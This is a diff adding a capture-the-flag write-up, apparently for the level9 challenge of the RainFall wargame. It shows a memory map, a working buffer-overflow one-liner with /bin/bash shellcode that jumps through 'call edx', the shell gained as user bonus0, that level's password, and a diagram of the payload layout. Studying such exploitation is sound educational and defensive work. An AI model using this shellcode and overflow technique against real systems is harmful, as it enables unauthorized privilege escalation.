@@ -1,0 +1,41 @@
+The stack, BSS and data sections are executables, the NX flag isn't set, we'll get a /bin/bash shellcode and jump on it through the call edx instruction.
+08048000-08053000 r-xp 00000000 07:00 12547      /bin/cat
+08053000-08054000 r--p 0000a000 07:00 12547      /bin/cat
+08054000-08055000 rw-p 0000b000 07:00 12547      /bin/cat
+08055000-08076000 rw-p 00000000 00:00 0          [heap]
+b7c2b000-b7e2b000 r--p 00000000 07:00 63348      /usr/lib/locale/locale-archive
+b7e2b000-b7e2c000 rw-p 00000000 00:00 0 
+b7e2c000-b7fcf000 r-xp 00000000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
+b7fcf000-b7fd1000 r--p 001a3000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
+b7fd1000-b7fd2000 rw-p 001a5000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
+b7fd2000-b7fd5000 rw-p 00000000 00:00 0 
+b7fdb000-b7fdd000 rw-p 00000000 00:00 0 
+b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
+b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
+b7ffe000-b7fff000 r--p 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
+b7fff000-b8000000 rw-p 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
+bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
+
+level9@RainFall:~$ ./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A"*71 + "\x0c\xa0\x04\x08"'`
+bash-4.2$ id
+uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
+bash-4.2$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+What the program does:
+memcpy of our argv[1] into a buffer withing 0x8048000-0x8053000 range addresses, that are executable. We can overflow the
+next 4 bytes that are dereferenced (through eax) and edx is set to the value.
+Then, edx is called through `call edx`
+
+The payload has this form:
+ [BUFFER_ADDR + 4][SHELLCODE][RANDOM_PADDING_STRING][BUFFER_ADDR]
+          |           ^                                  |
+    ^-----------------------------------------------------
+          |           |
+          -------------
+
+What will happen here:
+BUFFER_ADDR is dereferenced and passed to edx
+edx = [BUFFER_ADDR + 4]
+Then edx is called, so we jump on our Shellcode that runs a /bin/bash shell.
+That's it.
